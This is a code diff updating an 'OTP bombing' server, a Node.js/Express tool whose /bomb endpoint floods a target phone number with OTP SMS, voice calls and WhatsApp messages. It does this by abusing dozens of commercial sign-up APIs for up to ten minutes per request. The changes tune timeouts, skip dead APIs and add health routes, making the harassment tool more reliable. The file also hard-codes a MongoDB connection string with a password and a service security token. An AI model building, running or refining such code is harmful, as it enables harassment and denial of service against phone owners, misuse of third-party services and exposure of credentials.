@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (v6.0)
-// AbortController + DNS Timeout + Watchdog + Auto Re-test
+// api_server.js - OTP Bombing API Server (v7.0 FINAL)
+// 503 Reject + Health Route + Watchdog + Skip Dead APIs
 // ============================================================
 
 const express = require('express');
@@ -21,14 +21,14 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // ============================================================
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
-const DB_NAME = "otp_bb";
+const DB_NAME = "otp_bomber";
 
 const MAX_EFFECTIVE_DURATION = 10;
 const FIRST_RUN_RETRY = 1;
 const FIRST_RUN_DELAY = 30;
-const FIRST_RUN_TIMEOUT = 3000;
-const FIRST_RUN_RETRY_DELAY = 150;
-const DNS_TIMEOUT = 2000;
+const FIRST_RUN_TIMEOUT = 2500;              // 3000 → 2500ms
+const FIRST_RUN_RETRY_DELAY = 100;
+const DNS_TIMEOUT = 1500;                     // 2000 → 1500ms
 
 // 🔥 AUTO SLOW MODE
 const AUTO_SLOW_MODE = true;
@@ -36,19 +36,34 @@ const AUTO_SLOW_MODE_PHONE = '7777885694';
 const AUTO_SLOW_MODE_START_DELAY = 5000;
 const AUTO_SLOW_MODE_MAX_DURATION_MS = 10 * 60 * 1000;
 
-// 🔥 AUTO RE-TEST: agar DB me 43+ APIs hain toh re-test
+// 🔥 AUTO RE-TEST
 const AUTO_RETEST_THRESHOLD = 43;
 
 // 🔥 WATCHDOG
-const WATCHDOG_STUCK_MS = 30000;          // 30s stuck pe skip
-const WATCHDOG_CHECK_MS = 5000;           // har 5s check
+const WATCHDOG_STUCK_MS = 20000;
+const WATCHDOG_CHECK_MS = 3000;
 
-// 🔥 MAX WAITING REQUESTS
-const MAX_WAITING_REQUESTS = 5;
+// 🔥 MAX WAITING REQUESTS (ab 0 — koi queue nahi)
+const MAX_WAITING_REQUESTS = 0;
 
 // 🔥 LOG CLEANUP
 const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;
 const LOG_RETENTION_MS = 2 * 60 * 1000;
+
+// 🔥 SKIP DEAD APIS (jo bar bar hang karti hain)
+const SKIP_APIS = [
+    'MakeMyTrip',
+    'Ola',
+    'EasyMyTrip',
+    'Oyo_1',
+    'Dominos',
+    'PizzaHut',
+    'KFC',
+    'BurgerKing',
+    'Dineout',
+    'Purplle',
+    'AngelBroking'
+];
 
 // ============================================================
 // ===== CUSTOM HTTP/HTTPS AGENTS =====
@@ -56,19 +71,18 @@ const LOG_RETENTION_MS = 2 * 60 * 1000;
 
 const httpAgent = new http.Agent({
     keepAlive: true,
-    timeout: 3000,
+    timeout: 2500,
     maxSockets: 100,
     maxFreeSockets: 10
 });
 
 const httpsAgent = new https.Agent({
     keepAlive: true,
-    timeout: 3000,
+    timeout: 2500,
     maxSockets: 100,
     maxFreeSockets: 10
 });
 
-// 🔥 DNS Lookup with timeout
 function lookupWithTimeout(hostname, options, callback) {
     const lookupTimeout = setTimeout(() => {
         callback(new Error('DNS_TIMEOUT'));
@@ -92,13 +106,7 @@ class LogStore {
     }
 
     add(level, message, meta = {}) {
-        const log = {
-            timestamp: Date.now(),
-            time: new Date().toISOString(),
-            level,
-            message,
-            meta
-        };
+        const log = { timestamp: Date.now(), time: new Date().toISOString(), level, message, meta };
         this.logs.push(log);
         return log;
     }
@@ -123,26 +131,11 @@ class LogStore {
 
 const logStore = new LogStore();
 
-function logInfo(message, meta = {}) {
-    console.log(`ℹ️  ${message}`);
-    logStore.add('info', message, meta);
-}
-function logSuccess(message, meta = {}) {
-    console.log(`✅ ${message}`);
-    logStore.add('success', message, meta);
-}
-function logFail(message, meta = {}) {
-    console.log(`❌ ${message}`);
-    logStore.add('fail', message, meta);
-}
-function logWarn(message, meta = {}) {
-    console.log(`⚠️  ${message}`);
-    logStore.add('warn', message, meta);
-}
-function logError(message, meta = {}) {
-    console.error(`🔥 ${message}`);
-    logStore.add('error', message, meta);
-}
+function logInfo(message, meta = {}) { console.log(`ℹ️  ${message}`); logStore.add('info', message, meta); }
+function logSuccess(message, meta = {}) { console.log(`✅ ${message}`); logStore.add('success', message, meta); }
+function logFail(message, meta = {}) { console.log(`❌ ${message}`); logStore.add('fail', message, meta); }
+function logWarn(message, meta = {}) { console.log(`⚠️  ${message}`); logStore.add('warn', message, meta); }
+function logError(message, meta = {}) { console.error(`🔥 ${message}`); logStore.add('error', message, meta); }
 
 // ============================================================
 // ===== GLOBAL STATE =====
@@ -155,14 +148,14 @@ let slowModeCompleted = false;
 let autoSlowModeRunning = false;
 let waitingRequests = 0;
 let lastProgressTime = Date.now();
+let currentApiIndex = 0;
+let currentApiName = '';
 
 // ============================================================
 // ===== MONGODB CONNECTION =====
 // ============================================================
 
-mongoose.connect(MONGODB_URL, {
-    dbName: DB_NAME
-}).then(async () => {
+mongoose.connect(MONGODB_URL, { dbName: DB_NAME }).then(async () => {
     dbConnected = true;
     logSuccess('MongoDB Connected');
     await ensureIndexes();
@@ -170,9 +163,7 @@ mongoose.connect(MONGODB_URL, {
 
     if (AUTO_SLOW_MODE && firstRunMode) {
         logInfo(`⏰ Auto slow mode will start in ${AUTO_SLOW_MODE_START_DELAY / 1000}s...`);
-        setTimeout(() => {
-            triggerAutoSlowMode();
-        }, AUTO_SLOW_MODE_START_DELAY);
+        setTimeout(() => { triggerAutoSlowMode(); }, AUTO_SLOW_MODE_START_DELAY);
     }
 }).catch(err => {
     logError('MongoDB Error: ' + err.message);
@@ -277,7 +268,7 @@ const API_CONFIGS = [
         "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
         "headers": {
             "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
-            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy-8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
+            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
             "content-type": "application/json",
             "accept": "application/json, text/plain, */*",
@@ -1201,7 +1192,6 @@ const API_CONFIGS = [
     }
 ];
 
-// ===== VOICE APIS =====
 const VOICE_APIS = [
     {
         name: "Tata Capital Voice",
@@ -1253,7 +1243,6 @@ const VOICE_APIS = [
     }
 ];
 
-// ===== WHATSAPP APIS =====
 const WHATSAPP_APIS = [
     {
         name: "KPN WhatsApp",
@@ -1281,7 +1270,6 @@ const WHATSAPP_APIS = [
     }
 ];
 
-// ===== EXTRA APIS =====
 const EXTRA_APIS = [
     {
         name: "Lenskart SMS",
@@ -1350,7 +1338,7 @@ const EXTRA_APIS = [
 ];
 
 // ============================================================
-// ===== MERGE ALL APIS =====
+// ===== MERGE + FILTER SKIP APIS =====
 // ============================================================
 
 const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];
@@ -1361,14 +1349,19 @@ for (const api of allApis) {
     const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
     if (!seenUrls.has(urlKey)) {
         seenUrls.add(urlKey);
+        // 🔥 SKIP DEAD APIS
+        if (SKIP_APIS.includes(api.name)) {
+            console.log(`⏭️  Skipping known dead API: ${api.name}`);
+            continue;
+        }
         uniqueApis.push(api);
     }
 }
 
-logSuccess(`Loaded ${uniqueApis.length} unique APIs`);
+logSuccess(`Loaded ${uniqueApis.length} active APIs (${SKIP_APIS.length} skipped)`);
 
 // ============================================================
-// ===== FIRST-RUN DETECTION (WITH AUTO RE-TEST) =====
+// ===== FIRST-RUN DETECTION =====
 // ============================================================
 
 async function checkFirstRun() {
@@ -1376,7 +1369,6 @@ async function checkFirstRun() {
         const count = await ApiHealth.countDocuments({ tested: true });
         logInfo(`Found ${count} tested APIs in DB`);
 
-        // 🔥 AUTO RE-TEST: agar 43+ APIs hain toh reset karo
         if (count >= AUTO_RETEST_THRESHOLD) {
             logWarn(`⚠️ ${count} APIs in DB (>= ${AUTO_RETEST_THRESHOLD}). AUTO RE-TEST triggered!`);
             await ApiHealth.deleteMany({});
@@ -1403,24 +1395,18 @@ async function checkFirstRun() {
 }
 
 // ============================================================
-// ===== API CALL FUNCTION (ABORT + DNS TIMEOUT) =====
+// ===== API CALL FUNCTION =====
 // ============================================================
 
 function makeFallbackData(phone, apiName) {
     const lower = apiName.toLowerCase();
-    if (lower.includes('voice') || lower.includes('call')) {
-        return JSON.stringify({ mobile: phone });
-    }
-    if (lower.includes('whatsapp')) {
-        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
-    }
+    if (lower.includes('voice') || lower.includes('call')) return JSON.stringify({ mobile: phone });
+    if (lower.includes('whatsapp')) return JSON.stringify({ mobile: phone, channel: "whatsapp" });
     return JSON.stringify({ mobile: phone });
 }
 
-async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
+async function makeApiCall(api, phone, timeoutMs = 2500, retryCount = 0) {
     const startTime = Date.now();
-
-    // 🔥 ABORT CONTROLLER — true cancellation
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
@@ -1443,9 +1429,7 @@ async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
                 data = api.data(phone);
             } else if (api.data._raw) {
                 let rawData = api.data._raw;
-                if (typeof rawData === 'string') {
-                    rawData = rawData.replace(/{phone}/g, phone);
-                }
+                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                 data = rawData;
                 isRaw = true;
             } else {
@@ -1472,12 +1456,12 @@ async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
             url,
             headers,
             timeout: timeoutMs,
-            maxRedirects: 3,
+            maxRedirects: 2,
             validateStatus: () => true,
-            signal: controller.signal,        // 🔥 ABORT
+            signal: controller.signal,
             httpAgent,
             httpsAgent,
-            lookup: lookupWithTimeout          // 🔥 DNS TIMEOUT
+            lookup: lookupWithTimeout
         };
 
         if (method === 'post' || method === 'put') {
@@ -1488,9 +1472,7 @@ async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
                 }
             } else {
                 config.data = JSON.stringify(data);
-                if (!headers['Content-Type']) {
-                    headers['Content-Type'] = 'application/json';
-                }
+                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
             }
         }
 
@@ -1504,7 +1486,6 @@ async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
     } catch (err) {
         clearTimeout(timeoutId);
 
-        // Retry on network errors
         if (retryCount < 1 &&
             (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' ||
              err.code === 'ECONNABORTED' || err.name === 'AbortError' ||
@@ -1534,8 +1515,7 @@ async function makeApiCall(api, phone, timeoutMs = 3000, retryCount = 0) {
 
 setInterval(() => {
     if (slowModeLock && Date.now() - lastProgressTime > WATCHDOG_STUCK_MS) {
-        logWarn(`🐕 WATCHDOG: Slow mode stuck for ${WATCHDOG_STUCK_MS / 1000}s! Progress: ${lastProgressTime}`);
-        // 🔥 Force progress timestamp update (skip logic in loop)
+        logWarn(`🐕 WATCHDOG: Slow mode stuck at [${currentApiIndex + 1}/${uniqueApis.length}] ${currentApiName} for ${WATCHDOG_STUCK_MS / 1000}s! Forcing skip...`);
         lastProgressTime = Date.now();
     }
 }, WATCHDOG_CHECK_MS);
@@ -1559,15 +1539,17 @@ async function firstRunSlowMode(testPhone) {
 
     slowModeLock = (async () => {
         try {
-            logInfo(`FIRST RUN SLOW MODE: Testing all APIs (phone: ${phoneToTest})...`);
+            logInfo(`FIRST RUN SLOW MODE: Testing ${uniqueApis.length} APIs (phone: ${phoneToTest})...`);
             const workingApis = [];
             const startTime = Date.now();
 
             for (let i = 0; i < uniqueApis.length; i++) {
-                lastProgressTime = Date.now();   // 🔥 Update progress
+                currentApiIndex = i;
+                currentApiName = uniqueApis[i].name;
+                lastProgressTime = Date.now();
+
                 const api = uniqueApis[i];
 
-                // 🔥 10 min timer check
                 if (Date.now() - startTime > AUTO_SLOW_MODE_MAX_DURATION_MS) {
                     logWarn(`10 min timer reached! Stopping at API ${i + 1}/${uniqueApis.length}`);
                     break;
@@ -1581,7 +1563,7 @@ async function firstRunSlowMode(testPhone) {
                 for (let attempt = 0; attempt <= FIRST_RUN_RETRY; attempt++) {
                     const apiStartTime = Date.now();
 
-                    // 🔥 Each API wrapped in a hard 5s timeout
+                    // 🔥 Double protection: AbortController + Hard timeout
                     const result = await Promise.race([
                         makeApiCall(api, phoneToTest, FIRST_RUN_TIMEOUT),
                         new Promise((resolve) =>
@@ -1592,7 +1574,7 @@ async function firstRunSlowMode(testPhone) {
                                     responseTime: Date.now() - apiStartTime,
                                     hardTimeout: true
                                 });
-                            }, FIRST_RUN_TIMEOUT + 1500)
+                            }, FIRST_RUN_TIMEOUT + 1000)
                         )
                     ]);
 
@@ -1612,7 +1594,7 @@ async function firstRunSlowMode(testPhone) {
                 }
 
                 const avgTime = Math.round(totalResponseTime / Math.max(1, (successCount + failCount)));
-                const timeout = Math.max(2000, Math.min(avgTime * 2, 8000));
+                const timeout = Math.max(1500, Math.min(avgTime * 2, 6000));
 
                 try {
                     await ApiHealth.findOneAndUpdate(
@@ -1653,6 +1635,8 @@ async function firstRunSlowMode(testPhone) {
             return workingApis;
         } finally {
             slowModeLock = null;
+            currentApiIndex = 0;
+            currentApiName = '';
         }
     })();
 
@@ -1667,7 +1651,7 @@ async function triggerAutoSlowMode() {
     if (autoSlowModeRunning) return;
     autoSlowModeRunning = true;
 
-    logInfo('AUTO SLOW MODE STARTING (server startup test)...');
+    logInfo('AUTO SLOW MODE STARTING...');
     logInfo(`Test phone: ${AUTO_SLOW_MODE_PHONE}`);
     logInfo(`Max duration: ${AUTO_SLOW_MODE_MAX_DURATION_MS / 1000 / 60} minutes`);
 
@@ -1681,21 +1665,13 @@ async function triggerAutoSlowMode() {
     }
 }
 
-// ============================================================
-// ===== LOAD WORKING APIS =====
-// ============================================================
-
 async function loadWorkingApis() {
     const docs = await ApiHealth.find({ working: true }).lean();
     const result = [];
-
     for (const doc of docs) {
         const api = uniqueApis.find(a => a.name === doc.api_name);
-        if (api) {
-            result.push({ api, timeout: doc.timeout_ms || 5000 });
-        }
+        if (api) result.push({ api, timeout: doc.timeout_ms || 3000 });
     }
-
     return result;
 }
 
@@ -1708,12 +1684,28 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: uniqueApis.length,
+        skipped_apis: SKIP_APIS.length,
         first_run_mode: firstRunMode,
         slow_mode_running: !!slowModeLock,
         slow_mode_completed: slowModeCompleted,
-        auto_slow_mode_running: autoSlowModeRunning,
-        waiting_requests: waitingRequests,
+        current_testing: currentApiName || null,
+        current_index: currentApiIndex,
         db_connected: dbConnected,
+        uptime: process.uptime()
+    });
+});
+
+// 🔥 HEALTH ROUTE — bot check kar sakta hai
+app.get('/health', (req, res) => {
+    const ready = !firstRunMode && !slowModeLock && slowModeCompleted;
+    res.json({
+        ready,
+        slow_mode_running: !!slowModeLock,
+        first_run: firstRunMode,
+        completed: slowModeCompleted,
+        current_testing: currentApiName || null,
+        current_index: currentApiIndex,
+        total_apis: uniqueApis.length,
         uptime: process.uptime()
     });
 });
@@ -1725,42 +1717,32 @@ app.post('/bomb', async (req, res) => {
         return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
     }
 
-    // 🔥 MAX WAITING REQUESTS
-    if (firstRunMode && waitingRequests >= MAX_WAITING_REQUESTS) {
-        logWarn(`Server busy! ${waitingRequests} requests already waiting. Rejecting ${phone}`);
-        return res.json({
+    // 🔥 FIRST-RUN MODE ME TURANT REJECT (no queue)
+    if (firstRunMode || slowModeLock || !slowModeCompleted) {
+        logWarn(`Server in first-run mode. Rejecting ${phone} (no queue). Current: [${currentApiIndex + 1}/${uniqueApis.length}] ${currentApiName}`);
+        return res.status(503).json({
             success: false,
-            phone,
-            totalSent: 0,
-            sms: 0,
-            calls: 0,
-            whatsapp: 0,
-            message: 'Server busy, try again later'
+            message: 'Server busy with first-run setup. Try again in 60s.',
+            retry_after: 60,
+            slow_mode_running: !!slowModeLock,
+            current_testing: currentApiName || null,
+            current_index: currentApiIndex,
+            total_apis: uniqueApis.length
         });
     }
 
     const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);
-
-    logInfo(`Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | FirstRun: ${firstRunMode} | SlowLock: ${!!slowModeLock} | Waiting: ${waitingRequests}`);
-
-    if (firstRunMode) waitingRequests++;
+    logInfo(`Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min`);
 
     try {
         const startTime = Date.now();
         let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
 
-        let workingApis = [];
+        let workingApis = await loadWorkingApis();
 
-        if (firstRunMode || !slowModeCompleted) {
-            logInfo('Waiting for slow mode to complete...');
+        if (workingApis.length === 0) {
+            logWarn('No working APIs in DB. Activating slow mode...');
             workingApis = await firstRunSlowMode(phone);
-        } else {
-            workingApis = await loadWorkingApis();
-
-            if (workingApis.length === 0) {
-                logWarn('No working APIs in DB. Activating slow mode...');
-                workingApis = await firstRunSlowMode(phone);
-            }
         }
 
         if (workingApis.length === 0) {
@@ -1804,20 +1786,17 @@ app.post('/bomb', async (req, res) => {
 
                 if (result.status === 'fulfilled' && result.value) {
                     const val = result.value;
-                    const apiName = item.api.name;
                     if (val.success) {
-                        logSuccess(`API ${apiName} → ${val.status || 'OK'} (${val.responseTime}ms)`);
+                        logSuccess(`API ${item.api.name} → ${val.status || 'OK'} (${val.responseTime}ms)`);
                         success++;
                         sent++;
-                        const lowerName = apiName.toLowerCase();
+                        const lowerName = item.api.name.toLowerCase();
                         if (lowerName.includes('call') || lowerName.includes('voice')) callCount++;
                         else if (lowerName.includes('whatsapp')) whatsappCount++;
                         else smsCount++;
                     } else {
-                        logFail(`API ${apiName} → FAIL (${val.responseTime}ms)${val.hardTimeout ? ' [HARD TIMEOUT]' : ''}${val.dnsTimeout ? ' [DNS TIMEOUT]' : ''}`);
+                        logFail(`API ${item.api.name} → FAIL (${val.responseTime}ms)`);
                     }
-                } else {
-                    logFail(`API ${item.api.name} → REJECTED`);
                 }
             }
 
@@ -1843,8 +1822,6 @@ app.post('/bomb', async (req, res) => {
     } catch (error) {
         logError('Bombing error: ' + error.message);
         res.status(500).json({ error: error.message });
-    } finally {
-        if (firstRunMode) waitingRequests--;
     }
 });
 
@@ -1857,19 +1834,17 @@ app.get('/health-apis', async (req, res) => {
         const apis = await ApiHealth.find({}).sort({ working: -1, avg_response_time: 1 }).lean();
         const total = apis.length;
         const working = apis.filter(a => a.working).length;
-        const failed = total - working;
 
         res.json({
             summary: {
                 total_apis: uniqueApis.length,
+                skipped_apis: SKIP_APIS.length,
                 tested: total,
                 working,
-                failed,
+                failed: total - working,
                 first_run_mode: firstRunMode,
                 slow_mode_running: !!slowModeLock,
-                slow_mode_completed: slowModeCompleted,
-                auto_slow_mode_running: autoSlowModeRunning,
-                waiting_requests: waitingRequests
+                slow_mode_completed: slowModeCompleted
             },
             apis: apis.map(a => ({
                 name: a.api_name,
@@ -1889,11 +1864,10 @@ app.get('/health-apis', async (req, res) => {
 app.get('/logs', (req, res) => {
     const limit = parseInt(req.query.limit) || 100;
     const logs = logStore.getAll();
-    const recent = logs.slice(-limit);
     res.json({
         total_logs: logs.length,
         retention: '2 minutes',
-        logs: recent
+        logs: logs.slice(-limit)
     });
 });
 
@@ -1903,7 +1877,6 @@ app.post('/reset-health', async (req, res) => {
         firstRunMode = true;
         slowModeCompleted = false;
         slowModeLock = null;
-        waitingRequests = 0;
         logWarn('Health data reset. First-run mode activated.');
         res.json({ success: true, message: 'Health data reset. Next /bomb will trigger slow mode.' });
     } catch (err) {
@@ -1929,6 +1902,7 @@ app.get('/health-stats', async (req, res) => {
 
         res.json({
             total_apis: total,
+            skipped_apis: SKIP_APIS.length,
             tested,
             working,
             failed: tested - working,
@@ -1936,8 +1910,6 @@ app.get('/health-stats', async (req, res) => {
             first_run_mode: firstRunMode,
             slow_mode_running: !!slowModeLock,
             slow_mode_completed: slowModeCompleted,
-            auto_slow_mode_running: autoSlowModeRunning,
-            waiting_requests: waitingRequests,
             fastest_api: fastest ? { name: fastest.api_name, avg_ms: fastest.avg_response_time } : null,
             slowest_api: slowest ? { name: slowest.api_name, avg_ms: slowest.avg_response_time } : null
         });
@@ -1954,17 +1926,15 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
     logSuccess(`API Server running on port ${PORT}`);
     logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    logInfo(`APIs loaded: ${uniqueApis.length}`);
+    logInfo(`APIs loaded: ${uniqueApis.length} (skipped: ${SKIP_APIS.length})`);
     logInfo(`Max effective duration: ${MAX_EFFECTIVE_DURATION} min`);
-    logInfo(`First-run slow mode: Enabled (LOCKED)`);
-    logInfo(`MongoDB health tracking: Enabled`);
-    logInfo(`Auto slow mode: ${AUTO_SLOW_MODE ? 'ENABLED' : 'DISABLED'}`);
-    logInfo(`Log retention: 2 minutes (auto-cleanup)`);
-    logInfo(`AbortController: ENABLED`);
-    logInfo(`DNS Timeout: ${DNS_TIMEOUT}ms`);
+    logInfo(`First-run timeout: ${FIRST_RUN_TIMEOUT}ms`);
+    logInfo(`DNS timeout: ${DNS_TIMEOUT}ms`);
     logInfo(`Watchdog: ${WATCHDOG_STUCK_MS / 1000}s`);
-    logInfo(`Max waiting requests: ${MAX_WAITING_REQUESTS}`);
     logInfo(`Auto re-test threshold: ${AUTO_RETEST_THRESHOLD} APIs`);
+    logInfo(`Log retention: 2 minutes`);
+    logInfo(`AbortController + Hard timeout: ENABLED`);
+    logInfo(`503 reject on first-run: ENABLED`);
 
     logStore.startCleanup();
 });
